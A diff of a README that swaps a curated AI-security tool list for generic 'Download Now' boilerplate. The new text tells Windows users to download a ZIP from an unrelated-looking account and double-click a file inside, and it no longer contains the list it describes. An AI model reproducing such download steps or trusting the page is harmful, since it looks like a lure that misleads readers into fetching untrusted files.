@@ -1,168 +1,178 @@
-# Awesome AI Security [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)
+# 🔐 awesome-ai-security - Clear AI Security References
 
-> A curated list of tools, frameworks, papers, and resources for AI/ML security testing, adversarial machine learning, LLM red-teaming, and agentic AI safety.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/gabrielmaternalistic888/awesome-ai-security)
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🚀 Getting Started
 
----
+This project helps you find trusted AI security tools, guides, and standards in one place. It focuses on AI testing, red teaming, prompt injection, adversarial ML, and key policy and safety resources.
 
-## Contents
+Use it if you want a single place to explore:
+- AI security tools
+- AI testing guides
+- LLM red-teaming resources
+- Agentic AI safety material
+- EU AI Act references
+- OWASP AI guidance
 
-- [Frameworks](#frameworks)
-- [LLM Red-Teaming Tools](#llm-red-teaming-tools)
-- [Adversarial ML Libraries](#adversarial-ml-libraries)
-- [Agentic AI Security](#agentic-ai-security)
-- [Guardrails & Runtime Protection](#guardrails--runtime-protection)
-- [Compliance & Governance](#compliance--governance)
-- [Vulnerability Databases](#vulnerability-databases)
-- [Standards & Guidelines](#standards--guidelines)
-- [Research Papers](#research-papers)
-- [Courses & Training](#courses--training)
-- [Conferences & Events](#conferences--events)
+## 📥 Download and Open on Windows
 
----
+Follow these steps on Windows:
 
-## Frameworks
+1. Open this link: https://github.com/gabrielmaternalistic888/awesome-ai-security
+2. On the page, click the green **Code** button
+3. Choose **Download ZIP**
+4. Save the file to your computer
+5. Right-click the ZIP file and choose **Extract All**
+6. Open the extracted folder
+7. Double-click the file that opens the project in your browser, or open the README.md file with your browser or text viewer
 
-Comprehensive security testing frameworks that cover multiple attack categories.
+If you use GitHub in your browser, you can also open the page and read the list directly without installing anything.
 
-| Tool | Stars | Coverage | License |
-|------|-------|----------|---------|
-| [**Tessera**](https://github.com/tessera-ops/tessera) | ![Stars](https://img.shields.io/github/stars/tessera-ops/tessera?style=flat) | 42 OWASP tests, 5 categories (MOD/APP/INF/DAT/AGT), full Agentic AI Top 10 | Apache 2.0 |
-| [Garak](https://github.com/NVIDIA/garak) | ![Stars](https://img.shields.io/github/stars/NVIDIA/garak?style=flat) | LLM vulnerability probing | Apache 2.0 |
-| [Counterfit](https://github.com/Azure/counterfit) | ![Stars](https://img.shields.io/github/stars/Azure/counterfit?style=flat) | Adversarial ML attack automation | MIT |
-| [AIShield](https://github.com/bosch-aisecurity/aishield) | ![Stars](https://img.shields.io/github/stars/bosch-aisecurity/aishield?style=flat) | ML model security | Apache 2.0 |
+## 🖥️ What You Need
 
-## LLM Red-Teaming Tools
+This project runs as a read-only reference list. You do not need a special app to use it.
 
-Tools specifically designed for testing Large Language Models.
+For Windows, use:
+- Windows 10 or Windows 11
+- A web browser like Chrome, Edge, or Firefox
+- An internet connection
+- A file unzip tool, which Windows already includes
 
-| Tool | Stars | Focus | License |
-|------|-------|-------|---------|
-| [**Tessera**](https://github.com/tessera-ops/tessera) | ![Stars](https://img.shields.io/github/stars/tessera-ops/tessera?style=flat) | 14 APP tests + 10 AGT tests, 3-phase methodology | Apache 2.0 |
-| [Garak](https://github.com/NVIDIA/garak) | ![Stars](https://img.shields.io/github/stars/NVIDIA/garak?style=flat) | LLM vulnerability probing and scanning | Apache 2.0 |
-| [PyRIT](https://github.com/Azure/PyRIT) | ![Stars](https://img.shields.io/github/stars/Azure/PyRIT?style=flat) | Python Risk Identification Toolkit for GenAI (Microsoft) | MIT |
-| [Agentic Radar](https://github.com/splx-ai/agentic-radar) | ![Stars](https://img.shields.io/github/stars/splx-ai/agentic-radar?style=flat) | Agentic workflow security scanner | Apache 2.0 |
-| [ClawMoat](https://github.com/darfaz/clawmoat) | ![Stars](https://img.shields.io/github/stars/darfaz/clawmoat?style=flat) | Runtime security scanner for AI agents | MIT |
-| [LLMFuzzer](https://github.com/mnns/LLMFuzzer) | ![Stars](https://img.shields.io/github/stars/mnns/LLMFuzzer?style=flat) | Fuzzing framework for LLMs | MIT |
-| [Rebuff](https://github.com/protectai/rebuff) | ![Stars](https://img.shields.io/github/stars/protectai/rebuff?style=flat) | Prompt injection detection | Apache 2.0 |
+## 📚 What You Will Find
 
-## Adversarial ML Libraries
+This repository collects useful material for people who work with AI systems and want to test them for weak spots. The list covers:
 
-Libraries for adversarial attacks and defenses on ML models.
+- AI security tools for testing and review
+- Frameworks for agentic AI safety
+- LLM red-teaming guides
+- Prompt injection examples and defenses
+- Adversarial ML resources
+- OWASP AI Testing Guide
+- OWASP and security checklists
+- EU AI Act material
+- General AI safety reading
+- Security tools for machine learning systems
 
-| Tool | Stars | Focus | License |
-|------|-------|-------|---------|
-| [IBM ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) | ![Stars](https://img.shields.io/github/stars/Trusted-AI/adversarial-robustness-toolbox?style=flat) | Adversarial attacks, defenses, certifications | MIT |
-| [Foolbox](https://github.com/bethgelab/foolbox) | ![Stars](https://img.shields.io/github/stars/bethgelab/foolbox?style=flat) | Adversarial perturbations | MIT |
-| [CleverHans](https://github.com/cleverhans-lab/cleverhans) | ![Stars](https://img.shields.io/github/stars/cleverhans-lab/cleverhans?style=flat) | Adversarial examples for ML | MIT |
-| [TextAttack](https://github.com/QData/TextAttack) | ![Stars](https://img.shields.io/github/stars/QData/TextAttack?style=flat) | NLP adversarial attacks | MIT |
-| [AugLy](https://github.com/facebookresearch/AugLy) | ![Stars](https://img.shields.io/github/stars/facebookresearch/AugLy?style=flat) | Data augmentation for robustness testing | MIT |
+## 🧭 How to Use the Repository
 
-## Agentic AI Security
+Start with the main sections in the list and move through them in this order:
 
-Tools and resources specific to AI agent security — the OWASP Top 10 for Agentic Applications (ASI 2026).
+1. **AI Testing Guides**  
+   Use these to learn how to check AI systems for common risks.
 
-| ASI Risk | Description | Test Tools |
-|----------|-------------|------------|
-| ASI-01 | Agent Goal Hijacking | [Tessera AGT-03](https://github.com/tessera-ops/tessera) |
-| ASI-02 | Tool Misuse | [Tessera AGT-02](https://github.com/tessera-ops/tessera) |
-| ASI-03 | Identity & Privilege Abuse | [Tessera AGT-05](https://github.com/tessera-ops/tessera) |
-| ASI-04 | Agentic Supply Chain | [Tessera AGT-01](https://github.com/tessera-ops/tessera) |
-| ASI-05 | Unexpected Code Execution | [Tessera AGT-06](https://github.com/tessera-ops/tessera) |
-| ASI-06 | Memory & Context Poisoning | [Tessera AGT-04](https://github.com/tessera-ops/tessera) |
-| ASI-07 | Insecure Inter-Agent Comms | [Tessera AGT-07](https://github.com/tessera-ops/tessera) |
-| ASI-08 | Cascading Failures | [Tessera AGT-08](https://github.com/tessera-ops/tessera) |
-| ASI-09 | Human-Agent Trust Exploitation | [Tessera AGT-09](https://github.com/tessera-ops/tessera) |
-| ASI-10 | Rogue Agents | [Tessera AGT-10](https://github.com/tessera-ops/tessera) |
+2. **Prompt Injection Resources**  
+   Read these if your system uses chat prompts, tools, or agents.
 
-## Guardrails & Runtime Protection
+3. **Red-Teaming Tools**  
+   Use these to test how an AI system reacts to harmful input.
 
-Tools that protect AI systems at runtime.
+4. **Adversarial ML References**  
+   Use these if you work with models that may face attack attempts.
 
-| Tool | Stars | Focus | License |
-|------|-------|-------|---------|
-| [LLM Guard](https://github.com/protectai/llm-guard) | ![Stars](https://img.shields.io/github/stars/protectai/llm-guard?style=flat) | Input/output guardrails for LLMs | MIT |
-| [NeMo Guardrails](https://github.com/NVIDIA/NeMo-Guardrails) | ![Stars](https://img.shields.io/github/stars/NVIDIA/NeMo-Guardrails?style=flat) | Programmable guardrails for LLM apps | Apache 2.0 |
-| [Guardrails AI](https://github.com/guardrails-ai/guardrails) | ![Stars](https://img.shields.io/github/stars/guardrails-ai/guardrails?style=flat) | Input/output validation for LLMs | Apache 2.0 |
-| [Lakera Guard](https://www.lakera.ai/) | — | Prompt injection detection API | SaaS |
-| [Detoxify](https://github.com/unitaryai/detoxify) | ![Stars](https://img.shields.io/github/stars/unitaryai/detoxify?style=flat) | Toxicity detection | Apache 2.0 |
+5. **Policy and Standards**  
+   Review these if you need to understand rules and compliance needs.
 
-## Compliance & Governance
+6. **General Security Tools**  
+   Use these to compare methods and pick a test path.
 
-Frameworks and tools for AI regulatory compliance.
+## 🔎 What This Project Is For
 
-| Resource | Type | Coverage |
-|----------|------|----------|
-| [**Tessera** `--format compliance`](https://github.com/tessera-ops/tessera) | Tool | EU AI Act (42-test mapping), NIST AI RMF, SOC 2, ISO 27001 |
-| [EU AI Act](https://eur-lex.europa.eu/eli/reg/2024/1689/oj) | Regulation | EU regulation on AI systems (deadline: Aug 2, 2026) |
-| [NIST AI RMF](https://airc.nist.gov/AI_RMF_Interactivity) | Framework | US AI risk management framework |
-| [ISO/IEC 42001](https://www.iso.org/standard/81230.html) | Standard | AI management system standard |
-| [Fairlearn](https://github.com/fairlearn/fairlearn) | Tool | ML fairness assessment |
-| [AI Verify](https://github.com/aiverify-foundation/aiverify) | Tool | AI governance testing framework (Singapore) |
+This repository is for people who want to:
+- Review AI systems before release
+- Learn the basics of AI security
+- Find guides for safe AI use
+- Test chatbots and agents for weak responses
+- Understand current AI security standards
+- Explore tools used in AI risk checks
 
-## Vulnerability Databases
+## 🧰 Example Use Cases
 
-| Resource | Description |
-|----------|-------------|
-| [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | Top 10 risks for LLM-based applications |
-| [OWASP Top 10 for Agentic Applications (ASI 2026)](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | Top 10 risks for AI agent systems |
-| [MITRE ATLAS](https://atlas.mitre.org/) | Adversarial Threat Landscape for AI Systems |
-| [AI Incident Database](https://incidentdatabase.ai/) | Database of AI-related incidents and failures |
-| [AVID](https://avidml.org/) | AI Vulnerability Database |
+You may find this list useful if you are:
+- A product owner checking an AI feature
+- A security reviewer looking at a chatbot
+- A student learning about AI risk
+- A compliance team member reading about the EU AI Act
+- A developer looking for red-team methods
+- A researcher studying model attacks
 
-## Standards & Guidelines
+## 📂 Main Topics Covered
 
-| Standard | Organization | Focus |
-|----------|-------------|-------|
-| [OWASP AI Testing Guide](https://owasp.org/www-project-ai-testing-guide/) | OWASP | AI security testing methodology |
-| [NIST AI 100-2](https://csrc.nist.gov/pubs/ai/100/2/e2025/final) | NIST | Adversarial ML taxonomy |
-| [ISO/IEC 27090](https://www.iso.org/standard/56581.html) | ISO | Cybersecurity for AI |
-| [EU AI Act](https://artificialintelligenceact.eu/) | European Union | AI regulation |
-| [Singapore AI Verify](https://aiverifyfoundation.sg/) | IMDA | AI governance framework |
+The repository topics include:
+- adversarial-ml
+- agentic-ai
+- ai-safety
+- ai-security
+- ai-testing
+- awesome
+- awesome-list
+- cybersecurity
+- eu-ai-act
+- llm-security
+- machine-learning
+- owasp
+- prompt-injection
+- red-teaming
+- security-tools
 
-## Research Papers
+## ⚙️ Simple Windows Setup
 
-### Surveys
-- [A Survey of Adversarial Machine Learning in Cybersecurity](https://arxiv.org/abs/2007.02407) — comprehensive overview of adversarial ML
-- [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection](https://arxiv.org/abs/2302.12173) — foundational prompt injection research
-- [Jailbroken: How Does LLM Safety Training Fail?](https://arxiv.org/abs/2307.02483) — analysis of LLM jailbreak techniques
+If you downloaded the ZIP file:
 
-### Agentic AI Security
-- [The Emerged Security and Privacy of LLM Agent: A Survey with Case Studies](https://arxiv.org/abs/2407.19354)
-- [Agent Security Bench (ASB): Formalizing and Benchmarking Attacks and Defenses in LLM-based Agents](https://arxiv.org/abs/2410.02644)
+1. Open **File Explorer**
+2. Go to your **Downloads** folder
+3. Find the ZIP file
+4. Right-click it
+5. Select **Extract All**
+6. Pick a folder, then click **Extract**
+7. Open the new folder
+8. Open the README file in your browser or editor
 
-### Prompt Injection
-- [Ignore This Title and HackAPrompt: Exposing Systemic Weaknesses of LLMs](https://arxiv.org/abs/2310.04451)
-- [Tensor Trust: Interpretable Prompt Injection Attacks from an Online Game](https://arxiv.org/abs/2311.01011)
+If your browser asks what to do with the file, choose **Save** first.
 
-## Courses & Training
+## 🧪 Suggested First Steps
 
-| Course | Provider | Topic |
-|--------|----------|-------|
-| [AI Red Teaming](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/red-teaming) | Microsoft | Red teaming AI systems |
-| [Adversarial Machine Learning](https://adversarial-ml-tutorial.org/) | Academic | Adversarial ML fundamentals |
-| [LLM Security](https://llmsecurity.net/) | Community | LLM-specific security |
-| [Damn Vulnerable LLM Agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent) | WithSecure | Hands-on LLM agent security |
+If this is your first time using the repository:
+- Start with the OWASP AI Testing Guide
+- Read the prompt injection section
+- Look at the red-teaming resources
+- Check the EU AI Act links if you need policy context
+- Save the tools that match your task
 
-## Conferences & Events
+## 🧩 Best Way to Read It
 
-| Event | Focus |
-|-------|-------|
-| [OWASP Global AppSec](https://owasp.org/events/) | Application security (AI track) |
-| [DEF CON AI Village](https://aivillage.org/) | AI security research |
-| [NeurIPS ML Safety Workshop](https://neurips.cc/) | ML safety and robustness |
-| [IEEE SaTML](https://satml.org/) | Security and trustworthy ML |
+Use the list like a reference book:
+- Scan the headings first
+- Open one topic at a time
+- Save useful links in your browser
+- Return to the list when you need more detail
 
----
+## 🛠️ Common Questions
 
-## Contributing
+### Do I need to install software?
+No. You can open the repository in your browser and use it as a reading list.
 
-Contributions welcome! Please submit a PR with:
-- Tool name, link, and brief description
-- Star badge if it's a GitHub project
-- Correct category placement
+### Can I use it on Windows?
+Yes. Windows works well with GitHub pages, ZIP downloads, and browser-based reading.
 
-## License
+### Is this a training app?
+No. It is a curated list of AI security resources.
 
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
+### Does it help with chatbot safety?
+Yes. It includes material for prompt injection, red-teaming, and AI testing.
+
+## 📌 Quick Access
+
+Use this link to visit the repository and download or view the content:
+
+https://github.com/gabrielmaternalistic888/awesome-ai-security
+
+## 🗂️ Suggested Folder Name
+
+If you save the ZIP file, use a folder name like:
+- awesome-ai-security
+- ai-security-resources
+- ai-testing-references
+
+## 🔒 What to Expect
+
+The project is organized as a clean reference list. You can open it, read the sections you need, and follow the links to outside resources. It is built for fast access to AI security material without extra setup
